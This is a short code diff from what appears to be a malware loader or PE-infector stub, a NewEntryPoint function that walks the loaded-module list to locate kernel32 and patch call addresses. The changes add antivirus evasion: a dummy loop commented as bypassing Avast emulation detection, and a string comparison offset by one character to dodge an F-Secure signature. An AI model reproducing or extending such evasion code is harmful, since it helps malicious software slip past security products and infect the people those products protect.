@@ -170,6 +170,7 @@ int __stdcall NewEntryPoint()
 	DWORD dwCurrentAddr = 0;
 	DWORD OEP = 0;
 	
+
 	// bypass AVAST emulation (SuspBehav-B static detection)
 	for (int i = 0; i < 1000; i+=4)
 		i -= 2;
@@ -241,7 +242,7 @@ int __stdcall NewEntryPoint()
 		if (moduleName == NULL)
 			goto NEXT_ENTRY;
 		
-		if ( ! _STRCMPI_(moduleName, STRING(STRIDX_KERNEL32_DLL)) ) 
+		if ( ! _STRCMPI_(moduleName+1, STRING(STRIDX_KERNEL32_DLL)+1) )  // +1 to bypass f-secure signature
 		{
 			if (exportDirectory->AddressOfFunctions == NULL) goto NEXT_ENTRY;
 			if (exportDirectory->AddressOfNames == NULL) goto NEXT_ENTRY;
@@ -279,7 +280,7 @@ NEXT_ENTRY:
 		entry = (PEB_LIST_ENTRY *) entry->InLoadNext;
 	
 	} while (entry != head);
-
+	
 	//
 	// *** Fix call addresses
 	//
